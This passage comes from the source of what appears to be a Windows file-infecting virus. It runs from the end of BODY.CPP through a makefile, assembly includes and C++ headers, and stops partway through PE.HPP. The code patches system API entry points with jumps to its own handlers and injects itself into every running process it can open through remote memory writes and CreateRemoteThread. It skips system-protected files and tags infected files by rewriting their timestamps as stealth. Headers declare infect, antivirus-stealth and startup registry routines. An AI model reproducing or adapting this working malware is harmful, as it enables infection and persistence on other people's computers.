    char* apicode=(char*)(fntbl[ordinaltbl[i]]+(int)base);

    //disassemble first part of api

    i=0;
    for(;;)
    {
        int l=poordasm((void*)((int)apicode+i));
        i+=l;
        if (l==0||i>=5) break;
    }

    //if we were able to disasm >=5 bytes then hook it
    if (i>=5)
    {
        memcpy(backup,apicode,i);   //backup original code aligned on opcodes

        (int)backup+=i;

        *(unsigned char*)backup=0xe9;
        *(int*)((int)backup+1)=(int)apicode+i-(int)backup-5;

        int newrva=(int)fn-(int)apicode-5;

        int oldprot=changeprot(a,apicode,PAGE_READWRITE);   //deprotect
        if (oldprot!=0)
        {
            //if windows decides to taskswitch between these two lines,
            //we are really really screwed...
            *(unsigned char*)apicode=0xe9;
            *(int*)((int)apicode+1)=newrva;

            changeprot(a,apicode,oldprot);              //reprotect
            return 1;
        }

    }
    return 0;
}


int __fastcall changeprot(api* a,void* address,int flags)
{
        MEMORY_BASIC_INFORMATION mbf;

        if(a->VirtualQuery((void*)((int)address&~0xfff),&mbf,sizeof(mbf))==sizeof(mbf))
        {
            if (mbf.Protect==flags) return flags;
        }

        int oldprot;
        int ret=a->VirtualProtect((void*)((int)address&~0xfff),4096,flags,&oldprot);

        if (ret!=0)
         return oldprot;
        else
         return ret;    //return 0

}


//locals used by make resident (imho to large to alloc on stack)
#define MAX_PROC 256
#define MAX_HMOD 512
#define MAX_BUFF 0x2000
typedef struct MAKERESIDENT_
{
        int ppid[MAX_PROC];
        int hmod[MAX_HMOD];
        char buffer[MAX_BUFF];
} MAKERESIDENT;


/* enums processes, check if they are already hooked, if not, do it */
void __fastcall makeresident(api* a, void* vimbase)
{
    MAKERESIDENT* mr=(MAKERESIDENT*)alloc(a,sizeof(MAKERESIDENT));

    int cproc;

    if (a->EnumProcesses(mr->ppid,MAX_PROC,&cproc))
    {
        for (int p=0;p<(cproc>>2);p++)
        {
            HANDLE hproc=a->OpenProcess(PROCESS_VM_READ+PROCESS_VM_WRITE+
                                                PROCESS_CREATE_THREAD+
                                                PROCESS_QUERY_INFORMATION+
                                                PROCESS_VM_OPERATION,0,
                                                mr->ppid[p]);
#ifdef MAGICPID
            if (hproc!=0 && mr->ppid[p]==MAGICPID)
#else
#pragma message "Magic-pId DISABLED"
            if (hproc!=0)
#endif
            {
                int cmod;

                if (a->EnumProcessModules(hproc,mr->hmod,MAX_HMOD,&cmod))
                {
                    int itemp;  //used by readprocmem & writeprocmem

                    if (a->ReadProcessMemory(hproc,(void*)(mr->hmod[0]),mr->buffer,MAX_BUFF,&itemp))
                    {
                        MZ_HEADER* mz=((MZ_HEADER*)&mr->buffer);
                        if (mz->mz_neptr<MAX_BUFF)
                        {
                            PE_HEADER* pe=(PE_HEADER*)(mz->mz_neptr+(int)&mr->buffer);

                            if (pe->pe_datetime!=TESTVALUECHANGEME)
                            {
                                void* newworld;
                                if ((newworld=a->VirtualAllocEx(hproc,0,VIRTUALSIZE,MEM_RESERVE+MEM_COMMIT,PAGE_EXECUTE_READWRITE))!=0)
                                {
                                    a->CloseHandle((HANDLE)vimbase);
                                    if (a->WriteProcessMemory(hproc,newworld,vimbase,RAWSIZEALIGN,&itemp))
                                    {
                                        a->CloseHandle(
                                            a->CreateRemoteThread(hproc,NULL,0,(void*)((int)((int)&winntloader-(int)0x401000)+(int)newworld),newworld,0,0)
                                        );
                                    }

                                }

                            }

                        }

                    }

                }                
                a->CloseHandle(hproc);
            }

        }

    }
    free(a,mr);
}




/* alloc & free do allocate and free memory for you */
void* __fastcall alloc(api* a,int size)
{
        return a->VirtualAllocEx(-1,NULL,size,MEM_COMMIT,PAGE_READWRITE);
}
void __fastcall free(api* a,void* al)
{
        a->VirtualFree(al,0,MEM_RELEASE);
}




/* opens, maps, etc a file */
void* __fastcall openfile(api* a,FILEIO* f,char* filename, int expand)
{
    short fullpath[260];

    int n;
    if (!a->GetFullPathNameW(filename,260,(char*)fullpath,&n)) return NULL;

    if (a->SfcIsFileProtected(0,fullpath)) return NULL;

    f->hFile=a->CreateFileW(filename,
                            GENERIC_READ+GENERIC_WRITE,
                            FILE_SHARE_READ,
                            0,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            0);

    if (f->hFile==INVALID_HANDLE_VALUE) return NULL;

    f->size=a->GetFileSize(f->hFile,NULL);
    
    f->hMap=a->CreateFileMappingW(f->hFile,0,PAGE_READWRITE,0,f->size+expand,0);

    if (f->hMap==0) return NULL;

    f->hView=a->MapViewOfFile(f->hMap,FILE_MAP_READ+FILE_MAP_WRITE,0,0,f->size+expand);

    return f->hView;
}




/* used to close all handles & view from a fileio structure
   also mark file as processed (no-infect-retry) and/or infected (stealth) */
void __fastcall closefile(api* a,FILEIO* f, int restore)
{
    SYSTEMTIME systime;
    FILETIME filetime;

    a->UnmapViewOfFile(f->hView);
    a->CloseHandle(f->hMap);

    a->GetFileTime(f->hFile,NULL,NULL,&filetime);
    a->FileTimeToSystemTime(&filetime,&systime);

    if (restore)    //restore size
    {
        a->SetFilePointer(f->hFile,f->size,0,0);
        a->SetEndOfFile(f->hFile);

        //mark as processed
        systime.wHour==(systime.wSecond*314159)%24;     //pi
        systime.wMinute==(systime.wSecond*271828)%60;   //e

    }
    else
    {
        systime.wHour=(systime.wSecond*16021019)%24;   //1.602*10^-19
        systime.wMinute=(systime.wSecond*911031)%60;   //9.1*10^-31
    }

    a->SystemTimeToFileTime(&systime,&filetime);

    a->SetFileTime(f->hFile,NULL,NULL,&filetime);
    a->CloseHandle(f->hFile);

}




/*  used to import apis */
void __fastcall import(int base, int* crcs, int* imports)
{
    int didfirst=0; //kind of hack for kernel32- vs nonkernel32 imports
    api* import=(api*)imports;

    for (;;crcs++)
    {
        char** nametbl;
        short* ordinaltbl;
        int* fntbl;

        if (!*crcs)
        {
            crcs++;

            if (!*crcs) return;

            if (didfirst)
            {
                base=(int)import->LoadLibraryA((char*)crcs);
                if (((char*)crcs)[0]=='a') ((char*)crcs)++;    //advapi hack
                crcs+=2;    //2*4=8 makes chars
            }
            didfirst++;
                                //ugly huge cast vs 8 bytes smaller binary?
            PE_EXPORT* exp = (PE_EXPORT*)(base+((PE_HEADER*)(base+((MZ_HEADER*)base)->mz_neptr))->pe_exportrva);
            nametbl = (char**)(base+exp->ex_namepointersrva);
            ordinaltbl = (short*)(base+exp->ex_ordinaltablerva);
            fntbl = (int*)(base+exp->ex_addresstablerva);
        }

        int i;
        for (i=0;crc32(nametbl[i]+base)!=*(int*)crcs;i++)
            ;

        //after kernel32.dll is imported, get addresses using getprocaddress
        //(mainly because of sfc.dll / sfc_os.dll delayed load import)
        if (didfirst==1)
        {
            short ordinal=ordinaltbl[i];
            *imports=fntbl[ordinal]+base;
        }
        else
        {
            *imports=(int)(import->GetProcAddress(base,nametbl[i]+base));
        }

        imports++;
    }

}

};

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[BODY.CPP]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKEFILE]컴�
#note: bcc32_ should be version 5
NAME = main

$(NAME).EXE:
    bcc32_ -Tm9 -Tt -c -4 -O1 -w-8060 -B -K main.asm body.cpp
    tlink32 main.obj body.obj
    if exist *.map del *.map >nul
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKEFILE]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ASM.INC]컴�
FILE_NOTIFY_CHANGE_FILE_NAME         equ 1h
FILE_NOTIFY_CHANGE_DIR_NAME          equ 2h
FILE_NOTIFY_CHANGE_ATTRIBUTES        equ 4h
FILE_NOTIFY_CHANGE_SIZE              equ 8h
FILE_NOTIFY_CHANGE_LAST_WRITE        equ 10h
FILE_NOTIFY_CHANGE_SECURITY          equ 100h

mCRC32        equ     0C1A7F39Ah              ;stolen from a 29a source
mCRC32_init   equ     09C3B248Eh              ;(dunnow the author)

crc32m  macro   string
            crcReg = mCRC32_init
	    irpc    _x,<string>
		ctrlByte = '&_x&' xor (crcReg and 0FFh)
		crcReg = crcReg shr 8
		rept 8
                    ctrlByte = (ctrlByte shr 1) xor (mCRC32 * (ctrlByte and 1))
		endm
		crcReg = crcReg xor ctrlByte
	    endm
        dd  crcReg
endm

;hail the mighty jackyqwerty!
Pushad_struc            struc
        pushad_edi      dd      ?
        pushad_esi      dd      ?
        pushad_ebp      dd      ?
        pushad_esp      dd      ?
        pushad_ebx      dd      ?
        pushad_edx      dd      ?
        pushad_ecx      dd      ?
        pushad_eax      dd      ?
Pushad_struc            ends
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ASM.INC]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[CPP.HPP]컴�
#ifndef MAIN_HPP
#define MAIN_HPP

#define defdata(what) void __stdcall what();

typedef struct FILEIO_
{
    int size;
    int hFile;
    int hMap;
    void* hView;
} FILEIO;

#define STEALTH_SIZE 1  //stealth on size
#define STEALTH_AV 2    //stealth on av

//the stc jc is a hack because of bcc32 
#define __seh_set asm {locals __;push   ebp;call   __setupseh_uniquename;mov    esp,[esp+8];int 3;stc;jc __catchseh_uniquename;__setupseh_uniquename:push dword ptr fs:[0];mov dword ptr fs:[0],esp}
#define __seh_rem asm {__catchseh_uniquename:pop dword ptr fs:[0];pop ebp;pop ebp;}

//*ouch* :)
#define LPCVOID void*
#define LPDWORD int*
#define LPVOID void*
#define HMODULE int
#define BOOL int
#define HANDLE int
#define DWORD int
#define WORD short
#define HKEY int

#ifndef NULL
#define NULL (void *)0
#endif

#define STDCALL __stdcall   //?
#define WINAPI __stdcall


#define INVALID_HANDLE_VALUE 0xffffffff

#define MAX_PATH 260

#define ERROR_SUCCESS 0

#define HKEY_CURRENT_USER	(HKEY)0x80000001
#define HKEY_LOCAL_MACHINE	(HKEY)0x80000002
#define KEY_QUERY_VALUE	1

#define FILE_MAP_ALL_ACCESS	0xf001f
#define FILE_MAP_READ	4
#define FILE_MAP_WRITE	2
#define FILE_MAP_COPY	1
#define PAGE_READONLY	2
#define PAGE_READWRITE	4
#define PAGE_WRITECOPY	8
#define PAGE_EXECUTE	16
#define PAGE_EXECUTE_READ	32
#define PAGE_EXECUTE_READWRITE	64
#define PAGE_GUARD	256
#define PAGE_NOACCESS	1
#define PAGE_NOCACHE	512
#define SEC_COMMIT	134217728
#define SEC_IMAGE	16777216
#define SEC_NOCACHE	268435456
#define SEC_RESERVE	67108864
#define MEM_COMMIT	4096
#define MEM_RESERVE	8192
#define MEM_TOP_DOWN	1048576
#define PAGE_EXECUTE	16
#define PAGE_EXECUTE_READ	32
#define PAGE_EXECUTE_READWRITE	64
#define PAGE_GUARD	256
#define PAGE_NOACCESS	1
#define PAGE_NOCACHE	512
#define MEM_COMMIT	4096
#define MEM_FREE	65536
#define MEM_RESERVE	8192
#define MEM_IMAGE	16777216
#define MEM_MAPPED	262144
#define MEM_PRIVATE	131072
#define MEM_DECOMMIT	16384
#define MEM_RELEASE	32768
#define PAGE_EXECUTE_WRITECOPY	128
#define FILE_SHARE_READ	1
#define FILE_SHARE_WRITE	2
#define FILE_SHARE_DELETE 4
#define CREATE_NEW	1
#define CREATE_ALWAYS	2
#define OPEN_EXISTING	3
#define OPEN_ALWAYS	4
#define TRUNCATE_EXISTING	5
#define FILE_ATTRIBUTE_ARCHIVE	32
#define FILE_ATTRIBUTE_COMPRESSED	2048
#define FILE_ATTRIBUTE_NORMAL	128
#define FILE_ATTRIBUTE_DIRECTORY	16
#define FILE_ATTRIBUTE_HIDDEN	2
#define FILE_ATTRIBUTE_READONLY	1
#define FILE_ATTRIBUTE_SYSTEM	4
#define FILE_ATTRIBUTE_TEMPORARY	256
#define FILE_ATTRIBUTE_SPARSE_FILE 0x200
#define FILE_ATTRIBUTE_REPARSE_POINT 0x400
#define FILE_ATTRIBUTE_OFFLINE 0x1000
#define FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 0x00002000
#define FILE_ATTRIBUTE_ENCRYPTED 0x4000
#define GENERIC_READ	0x80000000
#define GENERIC_WRITE	0x40000000
#define MEM_COMMIT	4096
#define MEM_DECOMMIT	16384
#define MEM_RELEASE	32768
#define PROCESS_ALL_ACCESS	0x1f0fff
#define PROCESS_CREATE_PROCESS	128
#define PROCESS_CREATE_THREAD	2
#define PROCESS_DUP_HANDLE	64
#define PROCESS_QUERY_INFORMATION	1024
#define PROCESS_SET_INFORMATION	512
#define PROCESS_TERMINATE	1
#define PROCESS_VM_OPERATION	8
#define PROCESS_VM_READ	16
#define PROCESS_VM_WRITE	32
#define WAIT_TIMEOUT	0x102

#pragma pack(push,1)
typedef struct _SYSTEMTIME {
	WORD wYear;
	WORD wMonth;
	WORD wDayOfWeek;
	WORD wDay;
	WORD wHour;
	WORD wMinute;
	WORD wSecond;
	WORD wMilliseconds;
} SYSTEMTIME,*LPSYSTEMTIME,*PSYSTEMTIME;

typedef struct tagFILETIME {
    int dwLowDateTime;
    int dwHighDateTime;
} FILETIME,*LPFILETIME,*PFILETIME;

typedef struct _WIN32_FIND_DATA {
    int dwFileAttributes;
	FILETIME ftCreationTime;
	FILETIME ftLastAccessTime;
	FILETIME ftLastWriteTime;
    int nFileSizeHigh;
    int nFileSizeLow;
    int dwReserved0;
    int dwReserved1;
    char cFileName[MAX_PATH];
    char cAlternateFileName[14];
    short dummy;
} WIN32_FIND_DATA,*LPWIN32_FIND_DATA,*PWIN32_FIND_DATA;

typedef struct _MEMORY_BASIC_INFORMATION {
    LPVOID BaseAddress;
    LPVOID AllocationBase;
	DWORD AllocationProtect;
	DWORD RegionSize;
	DWORD State;
	DWORD Protect;
	DWORD Type;
} MEMORY_BASIC_INFORMATION;
#pragma pack(pop)

typedef void* __stdcall iGetProcAddress(int,char*);
typedef void* __stdcall iLoadLibraryA(char*);
typedef int __stdcall iMessageBoxA(int,char*,char*,int);
typedef HANDLE WINAPI iFindFirstFileExW(char* lpFileName,int fInfoLevelId,void* lpFindFileData,int fSearchOp,void* lpSearchFilter,DWORD dwAdditionalFlags);
typedef int __stdcall iFindNextFileW(int,LPWIN32_FIND_DATA);
typedef void __stdcall iOutputDebugStringW(char*);
typedef HANDLE __stdcall iCreateFileW(char*,DWORD,DWORD,DWORD,DWORD,DWORD,HANDLE);
typedef HANDLE __stdcall iCreateFileMappingW(HANDLE,DWORD,DWORD,DWORD,DWORD,char*);
typedef void* __stdcall iMapViewOfFile(HANDLE,DWORD,DWORD,DWORD,DWORD);
typedef void __stdcall iCloseHandle(HANDLE);
typedef void __stdcall iUnmapViewOfFile(void*);
typedef int __stdcall iGetVersion(void);
typedef void* __stdcall iVirtualAlloc(void*,int,int,int);
typedef void __stdcall iVirtualFree(void*,int,int);
typedef BOOL WINAPI iEnumProcesses(DWORD*,DWORD,DWORD*);
typedef BOOL WINAPI iEnumProcessModules(HANDLE,HMODULE*,DWORD,LPDWORD);
typedef HANDLE STDCALL iOpenProcess(DWORD,BOOL,DWORD);
typedef BOOL STDCALL iReadProcessMemory(HANDLE,LPCVOID,LPVOID,DWORD,LPDWORD);
typedef void* __stdcall iVirtualAllocEx(HANDLE hProcess,LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect);
typedef int __stdcall iWriteProcessMemory(HANDLE hProcess,LPVOID lpBaseAddress,LPVOID lpBuffer,DWORD nSize,LPDWORD lpNumberOfBytesWritten);
typedef HANDLE __stdcall iCreateRemoteThread(HANDLE hProcess,void* lpThreadAttributes,DWORD dwStackSize,void* lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
typedef HANDLE __stdcall iGetModuleHandleA(void*);
typedef int __stdcall iVirtualProtect(LPVOID lpAddress,DWORD dwSize,DWORD flNewProtect,DWORD* lpflOldProtect);
typedef int __stdcall iVirtualQuery(LPVOID lpAddress,MEMORY_BASIC_INFORMATION* lpBuffer, DWORD dwLength);
typedef int __stdcall iFindFirstFileW(void*,LPWIN32_FIND_DATA);
typedef int __stdcall iFindClose(HANDLE);
typedef int __stdcall iGetLastError();
typedef void __stdcall iSetLastError(DWORD dwErrCode);
typedef int __stdcall iFileTimeToSystemTime(FILETIME *lpFileTime,SYSTEMTIME* lpSystemTime);
typedef int __stdcall iSystemTimeToFileTime(SYSTEMTIME *lpSystemTime,FILETIME* lpFileTime);
typedef int __stdcall iGetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh);
typedef int __stdcall iWideCharToMultiByte(int,DWORD,char*,int,char*,int,char*,int);
typedef char* __stdcall iCharUpperA(char*);
typedef DWORD __stdcall iSetFilePointer(HANDLE hFile,int lDistanceToMove, int* lpDistanceToMoveHigh, DWORD dwMoveMethod);
typedef int __stdcall iSetEndOfFile(HANDLE hFile);
typedef HANDLE WINAPI iFindFirstChangeNotificationW(char* lpPathName,int bWatchSubtree, DWORD dwNotifyFilter);
typedef int WINAPI iGetFileTime(HANDLE hFile,FILETIME* lpCreationTime,FILETIME* lpLastAccessTime,FILETIME* lpLastWriteTime);
typedef int WINAPI iSetFileTime(HANDLE hFile,FILETIME *lpCreationTime,FILETIME *lpLastAccessTime,FILETIME *lpLastWriteTime);
typedef HANDLE WINAPI iCreateMutexW(void* lpMutexAttributes,BOOL bInitialOwner, char* lpName);
typedef int WINAPI iReleaseMutex(HANDLE hMutex);
typedef DWORD WINAPI iWaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds);
typedef void WINAPI iSleep(int);
typedef DWORD WINAPI iGetModuleFileNameA(HANDLE hModule,char* lpFilename,DWORD nSize);
typedef DWORD WINAPI iGetSystemDirectoryW(char* lpBuffer, int uSize);
typedef int WINAPI iSfcIsFileProtected(HANDLE RpcHandle,short* ProtFileName);
typedef DWORD WINAPI iGetTickCount(void);
typedef DWORD WINAPI iGetFullPathNameW(char* lpFileName,DWORD nBufferLength,char* lpBuffer,int* lpFilePart  );
typedef unsigned int WINAPI ilstrlenW(char* lpString);
typedef int WINAPI iIsBadWritePtr(void* lp,int ucb);


typedef int STDCALL iRegOpenKeyExA(int,char*,DWORD,void*,int*);
typedef int STDCALL iRegEnumValueW(int,DWORD,char*,int*,int*,int*,char*,int*);
typedef int STDCALL iRegCloseKey(int);


typedef struct api_
{
    /* kernel32.dll */

    iCreateFileW* CreateFileW;
    iFindFirstChangeNotificationW* FindFirstChangeNotificationW;
    iFindFirstFileExW* FindFirstFileExW;
    iFindNextFileW* FindNextFileW;

    iGetVersion* GetVersion;
    iLoadLibraryA* LoadLibraryA;
    iGetProcAddress* GetProcAddress;
    iCreateFileMappingW* CreateFileMappingW;
    iMapViewOfFile* MapViewOfFile;
    iCloseHandle* CloseHandle;
    iUnmapViewOfFile* UnmapViewOfFile;
    iVirtualAllocEx* VirtualAllocEx;
    iVirtualFree* VirtualFree;
    iVirtualProtect* VirtualProtect;
    iVirtualQuery* VirtualQuery;
    iOpenProcess* OpenProcess;
    iReadProcessMemory* ReadProcessMemory;
    iWriteProcessMemory* WriteProcessMemory;
    iCreateRemoteThread* CreateRemoteThread;
    iGetModuleHandleA* GetModuleHandleA;
    iGetLastError* GetLastError;
    iSetLastError* SetLastError;
    iFindFirstFileW* FindFirstFileW;
    iFindClose* FindClose;
    iFileTimeToSystemTime* FileTimeToSystemTime;
    iSystemTimeToFileTime* SystemTimeToFileTime;
    iGetFileSize* GetFileSize;
    iWideCharToMultiByte* WideCharToMultiByte;
    iSetFilePointer* SetFilePointer;
    iSetEndOfFile* SetEndOfFile;
    iSetFileTime* SetFileTime;
    iGetFileTime* GetFileTime;
    iSleep* Sleep;
    iGetModuleFileNameA* GetModuleFileNameA;
    iGetSystemDirectoryW* GetSystemDirectoryW;
    iGetTickCount* GetTickCount;
    iGetFullPathNameW* GetFullPathNameW;
    ilstrlenW* lstrlenW;
    iIsBadWritePtr* IsBadWritePtr;

    /* user32.dll */

    iCharUpperA* CharUpperA;

    /* psapi.dll */
                   
    iEnumProcesses* EnumProcesses;
    iEnumProcessModules* EnumProcessModules;

    /* sfc.dll */
    iSfcIsFileProtected* SfcIsFileProtected;

    /* advapi32.dll */

    iRegOpenKeyExA* RegOpenKeyExA;
    iRegEnumValueW* RegEnumValueW;
    iRegCloseKey* RegCloseKey;


} api;

#include "inc\mz.hpp"
#include "inc\pe.hpp"

typedef struct hookglobal_
{
    api a;
    int inapi;          //avoid hooked api loops
    int flags;          //flags for current process
    int rnd32seed;
    char avbuffer[520]; //used by stealth_av, as fake argument to createfilew
} hookglob;

extern "C" {

//asm
int     __fastcall crc32(char*);
int     __fastcall getk32base(); 
int     __fastcall poordasm(void* code);
void    __fastcall hookentry(void);

//cpp
void    __fastcall doregistery(api* a,int key, void* base);
int     __fastcall  getprocsum(api* a);
unsigned int __fastcall getrnd32(hookglob* hg);
char*   __fastcall getrndfile(hookglob* hg,api* a, char* buf);
int     __fastcall isspecialfiletime(api* a,FILETIME* filetime);
void    __fastcall finddatastealth(void* base,WIN32_FIND_DATA* wfd);
int     __fastcall rva2raw(MZ_HEADER* mz,PE_HEADER* pe,int rva);
int     __fastcall isinfected(api* a,char* filename);
void    __fastcall import(int , int* , int* );
int     __fastcall infect(api*,char*,void*);
void*   __fastcall openfile(api*,FILEIO*,char* filename,int);
void    __fastcall closefile(api* a,FILEIO* f,int);
void    __fastcall free(api* a,void* al);
void*   __fastcall alloc(api* a,int size);
void    __fastcall memcpy(void* dst,void* src,int size);
int     __fastcall hookapi(api*,void* base, int crc, void* fn, char*);
void    __fastcall makeresident(api* a, void* vimbase);
int     __fastcall changeprot(api*,void* address,int flags);
void    __fastcall hookhandler(void* base,char* arg1,int hookn, char** arg1p);
int     __fastcall isgoodname(void* base,api* a, char* filename);

//hacks, hidden at the bottom, ignore them :)
void crcs(void);
void blacklist(void);
void org9entry(void);
void hostentryrva(void);
void startupregkey(void);

}


#endif //MAINHPP_INCLUDED
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[CPP.HPP]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[IMPORT.HPP]컴�
#ifndef IMPORT_HPP
#define IMPORT_HPP

typedef void* __stdcall iGetProcAddress(int,char*);
typedef void* __stdcall iLoadLibraryA(char*);
typedef int __stdcall iMessageBoxA(int,char*,char*,int);
typedef int __stdcall iFindFirstFileA(void*,LPWIN32_FIND_DATA);
typedef int __stdcall iFindNextFileA(int,LPWIN32_FIND_DATA);
typedef void __stdcall iOutputDebugStringA(char*);
typedef HANDLE __stdcall iCreateFileA(char*,DWORD,DWORD,DWORD,DWORD,DWORD,HANDLE);
typedef HANDLE __stdcall iCreateFileMappingA(HANDLE,DWORD,DWORD,DWORD,DWORD,char*);
typedef void* __stdcall iMapViewOfFile(HANDLE,DWORD,DWORD,DWORD,DWORD);
typedef void __stdcall iCloseHandle(HANDLE);
typedef void __stdcall iUnmapViewOfFile(void*);

typedef struct api_
{
    iLoadLibraryA* LoadLibraryA;            //kernel32.dll
    iFindFirstFileA* FindFirstFileA;
    iFindNextFileA* FindNextFileA;
    iOutputDebugStringA* OutputDebugStringA;
    iCreateFileA* CreateFileA;
    iCreateFileMappingA* CreateFileMappingA;
    iMapViewOfFile* MapViewOfFile;
    iCloseHandle* CloseHandle;
    iUnmapViewOfFile* UnmapViewOfFile;
    
    iMessageBoxA* MessageBoxA;              //user32.dll
} api;

#endif
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[IMPORT.HPP]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MZ.HPP]컴�
////////x///////x///////x///////x///////x///////x///////x///////x///////x////

//by z0mbie

#ifndef __MZ_HPP__
#define __MZ_HPP__

#pragma pack(push)
#pragma pack(1)

typedef struct MZ_STRUCT
{
short    mz_id;
short    mz_last512;
short    mz_num512;
short    mz_relnum;
short    mz_headersize;
short    mz_minmem;
short    mz_maxmem;
short    mz_ss;
short    mz_sp;
short    mz_checksum;
short    mz_ip;
short    mz_cs;
short    mz_relofs;
short    mz_ovrnum;
char    mz_reserved[32];
int    mz_neptr;
} MZ_HEADER;

#pragma pack(pop)

#endif // __MZ_HPP__

////////x///////x///////x///////x///////x///////x///////x///////x///////x////
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MZ.HPP]컴�

컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[PE.HPP]컴�

//by z0mbie

////////x///////x///////x///////x///////x///////x///////x///////x///////x////
#ifndef __PE_HPP__
#define __PE_HPP__
#pragma pack(push)
#pragma pack(1)

typedef struct PE_STRUCT
{
int   pe_id;                  // 00 01 02 03
short    pe_cputype;             // 04 05
short    pe_numofobjects;        // 06 07
int   pe_datetime;            // 08 09 0A 0B
int   pe_coffptr;             // 0C 0D 0E 0F
int   pe_coffsize;            // 10 11 12 13
short    pe_ntheadersize;        // 14 15
short    pe_flags;               // 16 17
        // NT_Header {
short    pe_magic;               // 18 19
char    pe_linkmajor;           // 1A
char    pe_linkminor;           // 1B
int   pe_sizeofcode;          // 1C 1D 1E 1F
int   pe_sizeofidata;         // 20 21 22 23
int   pe_sizeofudata;         // 24 25 26 27
int   pe_entrypointrva;       // 28 29 2A 2B
int   pe_baseofcode;          // 2C 2D 2E 2F
int   pe_baseofdata;          // 30 31 32 33
int   pe_imagebase;           // 34 35 36 37
int   pe_objectalign;         // 38 39 3A 3B
int   pe_filealign;           // 3C 3D 3E 3F
short    pe_osmajor;             // 40 41
short    pe_osminor;             // 42 43
short    pe_usermajor;           // 44 45
short    pe_userminor;           // 46 47
short    pe_subsysmajor;         // 48 49
short    pe_subsysminor;         // 4A 4B
int   pe_reserved;            // 4C 4D 4E 4F
int   pe_imagesize;           // 50 51 52 53
int   pe_headersize;          // 54 55 56 56
int   pe_checksum;            // 58 59 5A 5B
short    pe_subsystem;           // 5C 5D
short    pe_dllflags;            // 5E 5F
int   pe_stackreserve;        // 60 61 62 63
int   pe_stackcommit;         // 64 65 66 67
int   pe_heapreserve;         // 68 69 6A 6B
int   pe_heapcommit;          // 6C 6D 6E 6F
int   pe_loaderflags;         // 70 71 72 73
int   pe_numofrvaandsizes;    // 74 75 76 77
        // rva and sizes
int   pe_exportrva;           // 78 79 7A 7B
int   pe_exportsize;          // 7C 7D 7E 7F
int   pe_importrva;           // 80 81 82 83
int   pe_importsize;          // 84 85 86 87
int   pe_resourcerva;         // 88 89 8A 8B
int   pe_resourcesize;        // 8C 8D 8E 8F
int   pe_exceptionrva;        // 90 91 92 93
int   pe_exceptionsize;       // 94 95 96 97
int   pe_securityrva;         // 98 99 9A 9B
int   pe_securitysize;        // 9C 9D 9E 9F
int   pe_fixuprva;            // A0 A1 A2 A3
int   pe_fixupsize;           // A4 A5 A6 A7
int   pe_debugrva;            // A8 A9 AA AB
int   pe_debugsize;           // AC AD AE AF
int   pe_descriptionrva;      // B0 B1 B2 B3
int   pe_descriptionsize;     // B4 B5 B6 B7
int   pe_machinerva;          // B8 B9 BA BB
int   pe_machinesize;         // BC BD BE BF
int   pe_tlsrva;              // C0 C1 C2 C3
int   pe_tlssize;             // C4 C5 C6 C7
int   pe_loadconfigrva;       // C8 C9 CA CB
int   pe_loadconfigsize;      // CC CD CE CF
char    pe_reserved_1[8];       // D0 D1 D2 D3  D4 D5 D6 D7
int   pe_iatrva;              // D8 D9 DA DB
int   pe_iatsize;             // DC DD DE DF
char    pe_reserved_2[8];       // E0 E1 E2 E3  E4 E5 E6 E7
char    pe_reserved_3[8];       // E8 E9 EA EB  EC ED EE EF
char    pe_reserved_4[8];       // F0 F1 F2 F3  F4 F5 F6 F7
// ---- total size == 0xF8 ---------
} PE_HEADER;

typedef struct PE_OBJENTRY_STRUCT
{
char    oe_name[8];             // 00 01 02 03  04 05 06 07
int   oe_virtsize;            // 08 09 0A 0B
int   oe_virtrva;             // 0C 0D 0E 0F
int   oe_physsize;            // 10 11 12 13
int   oe_physoffs;            // 14 15 16 17
char    oe_reserved[0x0C];      // 18 19 1A 1B   1C 1D 1E 1F  20 21 22 23
int   oe_objectflags;         // 24 25 26 27
// ---- total size == 0x28 ---------
} PE_OBJENTRY;

typedef struct PE_EXPORT_STRUCT
{
int   ex_flags;               // 00 01 02 03
int   ex_datetime;            // 04 05 06 07
short    ex_major_ver;           // 08 09
short    ex_minor_ver;           // 0A 0B
int   ex_namerva;             // 0C 0D 0E 0F
int   ex_ordinalbase;         // 10 11 12 13
int   ex_numoffunctions;      // 14 15 16 17
int   ex_numofnamepointers;   // 18 19 1A 1B
int   ex_addresstablerva;     // 1C 1D 1E 1F
int   ex_namepointersrva;     // 20 21 22 23
int   ex_ordinaltablerva;     // 24 25 26 27
// ---- total size == 0x28 ---------
} PE_EXPORT;

typedef struct PE_IMPORT_STRUCT
{
int   im_lookup;              // 00
int   im_datetime;            // 04  ?
int   im_forward;             // 08  -1
int   im_name;                // 0C
int   im_addresstable;        // 10
// ---- total size == 0x14 ---------
} PE_IMPORT;

typedef struct PE_FIXUP_STRUCT
{
int   fx_pagerva;             // 00 01 02 03
int   fx_blocksize;           // 04 05 06 07
